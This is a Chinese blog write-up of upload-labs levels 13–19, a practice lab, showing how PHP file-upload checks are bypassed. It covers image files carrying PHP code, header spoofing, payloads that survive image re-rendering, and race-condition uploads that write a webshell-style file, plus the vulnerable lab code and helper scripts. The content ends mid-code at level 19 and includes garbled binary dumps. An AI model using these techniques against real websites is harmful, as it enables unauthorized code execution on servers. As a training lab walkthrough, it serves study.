---
layout: post
title: "upload-labs详解13-20文件上传分析"
date: 2025-03-07 18:12:20 +0800
description: "以PHP为例,常用的文件包含函数有以下四种 include(),require(),include_once(),require_once()区别如下:require():找不到被包含的文件会产生致命错误，并停止脚本运行include():找不到被包含的文件只会产生警告，脚本继续执行require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含。"
keywords: "upload-labs详解（13-20）文件上传分析"
categories: ['未分类']
tags: ['网络安全', '文件上传', 'Web']
artid: "146073795"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146073795
    alt: "upload-labs详解13-20文件上传分析"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146073795
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146073795
cover: https://bing.ee123.net/img/rand?artid=146073795
image: https://bing.ee123.net/img/rand?artid=146073795
img: https://bing.ee123.net/img/rand?artid=146073795
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     upload-labs详解（13-20）文件上传分析
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <hr id="hr-toc" name="tableOfContents"/>
    <p>
    </p>
    <h2 id="upload-labs-env" name="upload-labs-env">
     upload-labs-env
    </h2>
    <h3 id="upload-labs-env%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3" name="upload-labs-env%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3">
     upload-labs-env第十三关
    </h3>
    <h4 id="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E" name="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">
     文件包含漏洞
    </h4>
    <p>
     以PHP为例,常用的文件包含函数有以下四种 include(),require(),include_once(),require_once()
    </p>
    <p>
     区别如下:
    </p>
    <ul>
     <li>
      <p>
       require():找不到被包含的文件会产生致命错误，并停止脚本运行
      </p>
     </li>
     <li>
      <p>
       include():找不到被包含的文件只会产生警告，脚本继续执行
      </p>
     </li>
     <li>
      <p>
       require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
      </p>
     </li>
     <li>
      <p>
       include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含
      </p>
     </li>
    </ul>
    <p>
     网页代码
    </p>
    <p>
     &lt;?php include $_GET['test']; ?&gt;
    </p>
    <p>
     php代码
    </p>
    <p>
     &lt;?php phpinfo(); ?&gt;
    </p>
    <p>
     利用文件包含，我们通过include函数来执行phpinfo.php页面，成功解析
    </p>
    <p>
     <img alt="" height="259" src="https://i-blog.csdnimg.cn/direct/591bc1913a614ef6af0b18916f0ba692.png" width="1132"/>
    </p>
    <p>
     将phpinfo.php文件后缀改为txt后进行访问，依然可以解析:
    </p>
    <p>
     将phpinfo.php文件后缀改为jpg格式，也可以解析:
    </p>
    <p>
     可以看出，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。
    </p>
    <h4 id="" name="">
    </h4>
    <h4 id="%E4%BB%A3%E7%A0%81" name="%E4%BB%A3%E7%A0%81">
     代码
    </h4>
    <pre><code class="language-php">function getReailFileType($filename){
    
    //fopen — 打开文件或者 URL
    //r - 表示以只读方式打开文件，文件必须存在，b表示以二进制方式打开文件，如果不加b，表示默认加了t，即以文本方式打开文件
    $file = fopen($filename, "rb");
    
    //fread — 读取文件（可安全用于二进制文件）,最多读取2字节
    $bin = fread($file, 2); //只读2字节
    
    //fclose — 关闭一个已打开的文件指针,将file指向的文件关闭
    fclose($file);
    
    //unpack 是 PHP 中用于解包二进制数据的函数，它可以将二进制字符串解析为 PHP 数组
    //@：错误控制运算符，用于抑制可能的警告或错误
    //C：表示无符号字符（unsigned char），占用 1 字节，范围为 0 到 255
    //2：表示解析 2 个字节
    $strInfo = @unpack("C2chars", $bin);
    
    //intval - 获取变量的整数值
    //将 $strInfo['chars1'] 和 $strInfo['chars2'] 的值拼接成一个字符串，然后将其转换为整数
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    
    //文件的后缀（如 .jpg, .png, .gif）通常是通过文件的**魔数（Magic Number）**来确定的，而不是直接通过文件的后缀名。魔数是文件开头的特定字节，用于标识文件的类型。解析前两个字节并拼接后得到的结果，实际上是文件魔数的一部分，用于匹配文件类型。
    //JPEG：文件头的前两个字节是 0xFFD8，转换为十进制是 255216
	//PNG：文件头的前两个字节是 0x8950，转换为十进制是 13780
	//GIF：文件头的前两个字节是 0x4749，转换为十进制是 7173
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}</code></pre>
    <h4 id="%E6%B5%8B%E8%AF%95" name="%E6%B5%8B%E8%AF%95">
     测试
    </h4>
    <p>
     先上传一个index.jgp，上传失败，后端对图片内容有检测，使用白名单，只能上传规定格式的文件
    </p>
    <p>
     <strong>
      使用文件包含，使图片文件中包含php代码
     </strong>
     生成图片码
    </p>
    <blockquote>
     <p>
      <strong>
       copy 00000.jpg /b + test.php /a test.jpg
      </strong>
     </p>
    </blockquote>
    <p>
     <img alt="" height="766" src="https://i-blog.csdnimg.cn/direct/94ddc3f6cfbb4fe284662c3d55b74a7e.png" width="790"/>
    </p>
    <h4 id="%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AA.jpg%E5%9B%BE%E7%89%87" name="%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AA.jpg%E5%9B%BE%E7%89%87">
     上传一个.jpg图片
    </h4>
    <p>
     复制图片地址，转到文件包含漏洞的位置
    </p>
    <p>
     使用get传递file
    </p>
    <p>
     包含成功
    </p>
    <p>
     <img alt="" height="328" src="https://i-blog.csdnimg.cn/direct/c4a5eab0ad4e442ca490bacb973f4d9e.png" width="1210"/>
    </p>
    <h4 id="%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AA.png%E6%96%87%E4%BB%B6" name="%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AA.png%E6%96%87%E4%BB%B6">
     上传一个.png文件
    </h4>
    <p>
     <img alt="" height="372" src="https://i-blog.csdnimg.cn/direct/14e22e5254704cb3bc8c014a941f5389.png" width="1002"/>
    </p>
    <h4 id="%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AA.gif%E5%9B%BE%E7%89%87" name="%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AA.gif%E5%9B%BE%E7%89%87">
     上传一个.gif图片
    </h4>
    <p>
     我们使用010editor编辑index.php文件，在文件头加上gif文件的头，
    </p>
    <p>
     <img alt="" height="268" src="https://i-blog.csdnimg.cn/direct/8688c80037b74c058df51e1c4d154689.png" width="1269"/>
    </p>
    <p>
     上传访问
    </p>
    <p>
     <img alt="" height="244" src="https://i-blog.csdnimg.cn/direct/fec4dd672be844debe8c31218c26989b.png" width="1216"/>
    </p>
    <h3 id="upload-labs-env%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3" name="upload-labs-env%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3">
     upload-labs-env第十四关
    </h3>
    <h4 id="%E4%BB%A3%E7%A0%81" name="%E4%BB%A3%E7%A0%81">
     代码
    </h4>
    <pre><code class="language-php">function isImage($filename){
    $types = '.jpeg|.png|.gif';
    
    //file_exists — 检查文件或目录是否存在
    if(file_exists($filename)){
        
        //getimagesize — 取得图像大小
        $info = getimagesize($filename);
        
        //image_type_to_extension — 取得图像类型的文件后缀
        $ext = image_type_to_extension($info[2]);
        
        //stripos — 查找字符串首次出现的位置（不区分大小写）
        if(stripos($types,$ext)&gt;=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;

//isset — 检测变量是否已声明并且其值不为 null
if(isset($_POST['submit'])){
    
    //获取上传文件的临时路径
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        
        //move_uploaded_file — 将上传的文件移动到新位置
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}</code></pre>
    <h4 id="%E6%80%9D%E8%B7%AF" name="%E6%80%9D%E8%B7%AF">
     思路
    </h4>
    <p>
     和十三关类似，我们上传一个文件包含的图片
    </p>
    <p>
     <img alt="" height="724" src="https://i-blog.csdnimg.cn/direct/26f65b0d8004493594848742f11415d9.png" width="1221"/>
    </p>
    <p>
     我们使用010editor编辑index.php文件，在文件头加上gif文件的头，
    </p>
    <p>
     <img alt="" height="649" src="https://i-blog.csdnimg.cn/direct/946a6c4dfa994c4a83889e7924ca2665.png" width="1231"/>
    </p>
    <h3 id="upload-labs-env%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3" name="upload-labs-env%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3">
     upload-labs-env第十五关
    </h3>
    <h4 id="%E4%BB%A3%E7%A0%81" name="%E4%BB%A3%E7%A0%81">
     代码
    </h4>
    <pre><code class="language-php">function isImage($filename){
    //需要开启php_exif模块
    
    //exif_imagetype — 判断一个图像的类型
    //exif_imagetype() 读取一个图像的第一个字节并检查其签名。
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}</code></pre>
    <h4 id="%E6%80%9D%E8%B7%AF" name="%E6%80%9D%E8%B7%AF">
     思路
    </h4>
    <p>
     也是判断上传文件类型
    </p>
    <pre><code class="language-php"> //exif_imagetype — 判断一个图像的类型
 //exif_imagetype() 读取一个图像的第一个字节并检查其签名。</code></pre>
    <p>
     上传测试
    </p>
    <p>
     <img alt="" height="1336" src="https://i-blog.csdnimg.cn/direct/b854e5d29149403eb44d94baab48b750.png" width="1272"/>
    </p>
    <h3 id="upload-labs-env%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3" name="upload-labs-env%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3">
     upload-labs-env第十六关
    </h3>
    <h4 id="%E4%BB%A3%E7%A0%81" name="%E4%BB%A3%E7%A0%81">
     代码
    </h4>
    <pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    //basename — 返回路径中的文件名部分
    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    //strrchr — 查找指定字符在字符串中的最后一次出现
    //substr从查找的位置按照0,1,2......顺序返回后面的字符
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            //imagecreatefromjpeg — 由文件或 URL 创建一个新图象。
            //图片文件上传之后，打乱生成一个新图片，我们可以找到没有打乱的部分，修改为一句话木马
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                
                //strval — 获取变量的字符串值
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") &amp;&amp; ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}</code></pre>
    <h4 id="%E6%80%9D%E8%B7%AF" name="%E6%80%9D%E8%B7%AF">
     思路
    </h4>
    <p>
     寻找没有打乱的部分，上传一句话木马
    </p>
    <h4 id="%E6%B5%8B%E8%AF%95" name="%E6%B5%8B%E8%AF%95">
     测试
    </h4>
    <p>
     上传图片，下载被上传之后的图片
    </p>
    <p>
     上传一个含有一句话木马的test_j.jpg
    </p>
    <pre><code class="language-php">?? JFIF  ? ?  ? C 
  








? C		


?   [" ?            	

? ?   } !1AQa "q2亼?#B绷R佯$3br?
%&amp;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz儎厗噲墛挀敃枟槞殺￥ウЖ┆渤吹斗腹郝媚牌侨墒矣哉肿刭卺忏溴骁栝犟蝮趱鲼??         	

? ?   w !1AQ aq"2?B憽绷	#3R?br?$4??&amp;'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz們剠唶垑姃摂晼棙櫄ⅲぅΗī炒刀犯购旅呐魄壬室釉罩棕仝忏溴骁栝牝篝貊鼬?   ? 齋⒕h?E??颠坾ｘ鈅
x寐V荕礆?e笣A侷鈶p??僯酻Y穾撪弢S'目? 黓姱|!=澱幖盅[茌Y^D?
琟le7F?B独I?y)w苦鵢饩?k鵞馡/V{?Q@聤(???????彽x 倐	x⑦煤暉€4兴﹊焙嵁?YaY?+$珒滎婘_??醂^x玘誹栺7?Wz泛殖鯽k瀂鄠??Q€輲X?&lt;zeG輮彲?/螓?摀~焺T@(QE QE QE QE??php
phpinfo();
?&gt;</code></pre>
    <p>
     下载被上传后的文件
    </p>
    <pre><code class="language-php">?? JFIF      ? &gt;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), default quality
? C     		



 $.' ",#(7),01444'9=82&lt;.342? C			


2!!22222222222222222222222222222222222222222222222222?   [" ?            	

? ?   } !1AQa "q2亼?#B绷R佯$3br?
%&amp;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz儎厗噲墛挀敃枟槞殺￥ウЖ┆渤吹斗腹郝媚牌侨墒矣哉肿刭卺忏溴骁栝犟蝮趱鲼??         	

? ?   w !1AQ aq"2?B憽绷	#3R?br?$4??&amp;'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz們剠唶垑姃摂晼棙櫄ⅲぅΗī炒刀犯购旅呐魄壬室釉罩棕仝忏溴骁栝牝篝貊鼬?   ? 麝+嚫蛔?塛??T:l7
錋J$gq??澕?类sW&lt;/猨']讄?┹嬮t讑Hn蘪?R唀w.?# -Du碤E
(
(
(
(&lt;趉MF屪铴j1贠?D饄袶徝(e&gt;鄦廕挈=徇靑o飊n皖Ж?汗螯祄"&amp;N誙?撟$猪-
@?QE QE QE QE QE ?</code></pre>
    <p>
     已经将php代码打乱
    </p>
    <h4 id="%E4%B8%8A%E4%BC%A0gif%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6%E2%80%94%E2%80%94%E8%BE%83%E7%AE%80%E5%8D%95%E2%80%94%E2%80%94%E6%AF%94%E8%BE%83%E5%9B%BE%E7%89%87" name="%E4%B8%8A%E4%BC%A0gif%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6%E2%80%94%E2%80%94%E8%BE%83%E7%AE%80%E5%8D%95%E2%80%94%E2%80%94%E6%AF%94%E8%BE%83%E5%9B%BE%E7%89%87">
     上传gif格式文件——较简单——比较图片
    </h4>
    <p>
     先找一个gif文件
    </p>
    <p>
     我们使用010editor软件进行比较
    </p>
    <p>
     打开工具，比较，选择文件
    </p>
    <p>
     <img alt="" height="679" src="https://i-blog.csdnimg.cn/direct/e366eeb18068474096c5a08541a0f71f.png" width="1032"/>
    </p>
    <p>
     找到相同部分
    </p>
    <p>
     我们在文件，插入一句话木马，尽量在00字段插入，不会影响数据
    </p>
    <p>
     <img alt="" height="148" src="https://i-blog.csdnimg.cn/direct/c0c01cbdca8249f299726a05207ce213.png" width="1062"/>
    </p>
    <p>
     重新上茶访问
    </p>
    <p>
     <img alt="" height="345" src="https://i-blog.csdnimg.cn/direct/de3ae703fffd42dca0801e93f29d1d18.png" width="1029"/>
    </p>
    <h4 id="%E4%B8%8A%E4%BC%A0png%E6%A0%BC%E5%BC%8F%E5%9B%BE%E7%89%87%E2%80%94%E2%80%94%E8%BE%83%E9%BA%BB%E7%83%A6" name="%E4%B8%8A%E4%BC%A0png%E6%A0%BC%E5%BC%8F%E5%9B%BE%E7%89%87%E2%80%94%E2%80%94%E8%BE%83%E9%BA%BB%E7%83%A6">
     上传png格式图片——较麻烦
    </h4>
    <p>
     这里我们使用脚本
    </p>
    <p>
     demo.php
    </p>
    <pre><code class="language-php">&lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y &lt; sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?&gt;</code></pre>
    <p>
     网站打开文件demo.php
    </p>
    <p>
     运行后得到1.png.上传后下载到本地打开如下图
    </p>
    <p>
     <img alt="" height="658" src="https://i-blog.csdnimg.cn/direct/6f93c105be03421fbb7529ae1a68272e.png" width="1390"/>
    </p>
    <p>
     使用010editor打开，发现一句话木马已经存在了，现在就可以上传运行了
    </p>
    <p>
     <img alt="" height="219" src="https://i-blog.csdnimg.cn/direct/30ef173dd8ee4b1a85eae1e325ce3376.png" width="1069"/>
    </p>
    <h4 id="%E4%B8%8A%E4%BC%A0jpg%E6%A0%BC%E5%BC%8F%E5%9B%BE%E7%89%87%E2%80%94%E2%80%94%E6%9C%89%E4%B8%80%E4%BA%9B%E4%B8%8D%E8%83%BD%E8%A2%AB%E5%A4%84%E7%90%86%EF%BC%8C%E8%A6%81%E5%A4%9A%E8%AF%95%E5%87%A0%E6%AC%A1" name="%E4%B8%8A%E4%BC%A0jpg%E6%A0%BC%E5%BC%8F%E5%9B%BE%E7%89%87%E2%80%94%E2%80%94%E6%9C%89%E4%B8%80%E4%BA%9B%E4%B8%8D%E8%83%BD%E8%A2%AB%E5%A4%84%E7%90%86%EF%BC%8C%E8%A6%81%E5%A4%9A%E8%AF%95%E5%87%A0%E6%AC%A1">
     上传jpg格式图片——有一些不能被处理，要多试几次
    </h4>
    <p>
     也是使用脚本
    </p>
    <p>
     随便找一个jpg图片,先上传至服务器然后再下载到本地保存为
     <code>
      1.jpg
     </code>
     .
    </p>
    <p>
     插入php代码
    </p>
    <p>
     使用脚本处理
     <code>
      1.jpg
     </code>
     ,命令
     <code>
      php demo.php 1.jpg
     </code>
    </p>
    <p>
     <img alt="" height="889" src="https://i-blog.csdnimg.cn/direct/f98f1388ad8e479ea69a2fd8ada55494.png" width="1258"/>
    </p>
    <p>
     使用16进制编辑器打开,就可以看到插入的php代码.
    </p>
    <p>
     <img alt="" height="217" src="https://i-blog.csdnimg.cn/direct/1d9639f6b2b74d25a479ba1736bfd228.png" width="1002"/>
    </p>
    <p>
     将生成的
     <code>
      payload_1.jpg
     </code>
     上传.
    </p>
    <p>
     将上传的图片再次下载到本地,使用16进制编辑器打开
    </p>
    <p>
     可以看到,php代码没有被去除. 证明我们成功上传了含有php代码的图片.
    </p>
    <p>
     需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.
    </p>
    <h3 id="upload-labs-env%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3" name="upload-labs-env%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3">
     upload-labs-env第十七关
    </h3>
    <p>
    </p>
    <h4 id="%E4%BB%A3%E7%A0%81" name="%E4%BB%A3%E7%A0%81">
     代码
    </h4>
    <pre><code class="language-php">$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    
    //array — 新建一个数组
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    
    //获取文件后缀
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        
        //in_array — 检查数组中是否存在某个值
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
            
            //rename — 重命名一个文件或目录
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            
            //unlink — 删除文件
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}</code></pre>
    <h4 id="%E6%80%9D%E8%B7%AF" name="%E6%80%9D%E8%B7%AF">
     思路
    </h4>
    <p>
     代码处理流程
    </p>
    <ul>
     <li>
      <p>
       移动文件到指定路径
      </p>
     </li>
     <li>
      <p>
       判断文件后缀是否符合
      </p>
     </li>
     <li>
      <p>
       符合则重命名
      </p>
     </li>
     <li>
      <p>
       不符合则删除文件
      </p>
     </li>
    </ul>
    <p>
     错误点：
    </p>
    <p>
     <strong>
      先上传，后删除，中间有一个极短的窗口期，文件是在服务器中的，可以进行操作
     </strong>
    </p>
    <p>
     漏洞：
    </p>
    <p>
     条件竞争漏洞
    </p>
    <p>
     在phpcmsv9也有同样的漏洞，可以直接上传webshell
    </p>
    <h4 id="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">
     解题思路
    </h4>
    <p>
     创建一个新木马文件creat.php，用于执行时则创建一个info1.php文件
    </p>
    <pre><code class="language-php">&lt;?php 
    
    //fputs - fwrite的别名 — 写入文件（可安全用于二进制文件）
    //fopen — 以写入的方式打开文件或者 URL
    fputs(fopen('../web.php','w'),'&lt;?php phpinfo();?&gt;');?&gt;</code></pre>
    <pre><code class="language-php">&lt;?php 
    
    //file_put_contents — 将数据写入文件
    file_put_concents('../shell.php','&lt;?php phpinfo();?&gt;');?&gt;</code></pre>
    <p>
     建议生成文件到上一层目录
    </p>
    <p>
     因为同级目录可能会循环删除
    </p>
    <h4 id="%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95" name="%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95">
     上传测试
    </h4>
    <p>
     我们发现上传就被删掉了
    </p>
    <h4 id="%E4%BD%BF%E7%94%A8Burpsuite%E5%A4%9A%E6%AC%A1%E4%B8%8A%E4%BC%A0" name="%E4%BD%BF%E7%94%A8Burpsuite%E5%A4%9A%E6%AC%A1%E4%B8%8A%E4%BC%A0">
     使用Burpsuite多次上传
    </h4>
    <p>
     <img alt="" height="259" src="https://i-blog.csdnimg.cn/direct/f50fddc1a5084c19adb5b89fbcd7afae.png" width="894"/>
    </p>
    <p>
     发送到攻击器
    </p>
    <p>
     添加payload爆破
    </p>
    <p>
     持续发包
    </p>
    <p>
     持续的发包，我们也需要不间断的去访问
    </p>
    <p>
     我们也可以使用Burpsuite不间断的去访问，比手动效率高
    </p>
    <h4 id="%E7%94%9F%E6%88%90" name="%E7%94%9F%E6%88%90">
     生成
    </h4>
    <p>
     在上级目录已经生成web.php文件
    </p>
    <p>
     <img alt="" height="94" src="https://i-blog.csdnimg.cn/direct/1ee6a5e64faf43a991ff3221dbfe354a.png" width="322"/>
    </p>
    <p>
     访问成功
    </p>
    <p>
     <img alt="" height="211" src="https://i-blog.csdnimg.cn/direct/d91f62247f0944bb85b1fa7720c70cd7.png" width="718"/>
    </p>
    <h3 id="upload-labs-env%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3" name="upload-labs-env%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3">
     upload-labs-env第十八关
    </h3>
    <h4 id="%E6%80%9D%E8%B7%AF" name="%E6%80%9D%E8%B7%AF">
     思路
    </h4>
    <p>
     上传的文件还是先上传，后重命名
    </p>
    <p>
     使用文件包含，上传一个图片码，在后端代码执行到重命名之前，使用客户端访问到
    </p>
    <h4 id="%E6%B5%8B%E8%AF%95" name="%E6%B5%8B%E8%AF%95">
     测试
    </h4>
    <p>
     测试图片码的phpinfo();可不可以执行
    </p>
    <p>
     <img alt="" height="115" src="https://i-blog.csdnimg.cn/direct/719d059de8244118a766621584d9b727.png" width="1414"/>
    </p>
    <p>
     可以执行
    </p>
    <p>
     <img alt="" height="585" src="https://i-blog.csdnimg.cn/direct/f8fe5d0a7cb3417ab1cf2394c88f06fc.png" width="1411"/>
    </p>
    <p>
     编辑demo.php
    </p>
    <pre><code class="language-php">&lt;?php fputs(fopen('../web123.php','w'),'&lt;?php phpinfo();?&gt;');?&gt;</code></pre>
    <p>
     生成图片码
    </p>
    <p>
     <img alt="" height="109" src="https://i-blog.csdnimg.cn/direct/c88e3d90972442df81796198cb792cb9.png" width="1056"/>
    </p>
    <p>
     查看图片码
    </p>
    <p>
     <img alt="" height="91" src="https://i-blog.csdnimg.cn/direct/5f66ffa72ecb4d7f8fd9b513fb5e136b.png" width="1354"/>
    </p>
    <p>
     上传抓包爆破
    </p>
    <p>
     访问查看是否成功
    </p>
    <p>
     也可以使用Python脚本查看是否有成功的案例
    </p>
    <pre><code class="language-python">import requests
url = "http://10.212.99.94/include.php?file=upload/web123.png"
while True:
    html = requests.get(url)
    if ('Warning' not in str(html.text)):
        print('ok')
        break</code></pre>
    <p>
     在上一级目录中生成了重命名后的文件，我们访问可以看到图片码上传成功，
    </p>
    <p>
     对于没有被重命名的文件，重复上传，是否成功，有一定的运气在其中
    </p>
    <h4 id="" name="">
    </h4>
    <h3 id="upload-labs-env%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3" name="upload-labs-env%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3">
     upload-labs-env第十九关
    </h3>
    <h4 id="" name="">
    </h4>
    <h4 id="%E4%BB%A3%E7%A0%81" name="%E4%BB%A3%E7%A0%81">
     代码
    </h4>
    <pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    
    //file_exists — 检查文件或目录是否存在
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        
        //pathinfo — 返回文件路径的信息
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        
        //in_array — 检查数组中是否存在某个值
        if(!in_array($file_ext,$deny_ext)) {
            
            //$_FILES — HTTP 文件上传变量
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
